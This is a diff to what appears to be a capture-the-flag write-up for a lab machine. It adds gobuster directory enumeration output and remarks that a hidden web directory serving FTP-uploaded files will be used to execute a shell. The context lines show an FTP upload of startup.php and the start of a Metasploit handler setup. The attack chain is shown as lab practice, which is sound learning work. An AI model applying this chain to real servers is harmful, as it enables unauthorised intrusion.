@@ -42,6 +42,27 @@ PORT   STATE SERVICE VERSION
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
+## Web Enum :
+
+```
+bvr0n@kali:~$ gobuster dir -u http://10.10.252.135/ -w Documents/Dirbuster/wordlist.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.252.135/
+[+] Threads:        10
+[+] Wordlist:       Documents/Dirbuster/wordlist.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/11/08 06:58:30 Starting gobuster
+===============================================================
+/***** (Status: 301)
+```
+The `/*****` is holding the shared files via `FTP`, we gonna need it later to execute our shell.
+
 ## FTP :
 
 ```                                                        
@@ -69,7 +90,7 @@ startup.php:                                            37.42 kB  124.55 kB/s
 Could not preserve times for startup.aspx: UTIME failed.
 ncftp /ftp >
 ```
-Set a Metasploit handler and exploit (execute script in browser) :
+Set a Metasploit handler and exploit :
 
 ```
 msf5 exploit(multi/handler) > use exploit/multi/handler
